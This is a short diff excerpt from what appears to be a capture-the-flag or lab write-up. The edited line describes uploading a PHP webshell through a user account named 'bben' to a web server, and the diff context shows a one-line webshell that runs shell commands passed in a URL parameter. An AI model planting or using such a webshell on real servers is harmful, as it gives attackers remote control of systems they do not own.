@@ -90,7 +90,7 @@ Then we find the users and see that we can change their password, after checking
 
 ## ⚡ Web Shell Access
 
-Upload a PHP webshell:
+Upload a PHP webshell via bben's account to the webProd where we see the login.php, register.php:
 
 ```php
 <?=`$_GET[0]`?>
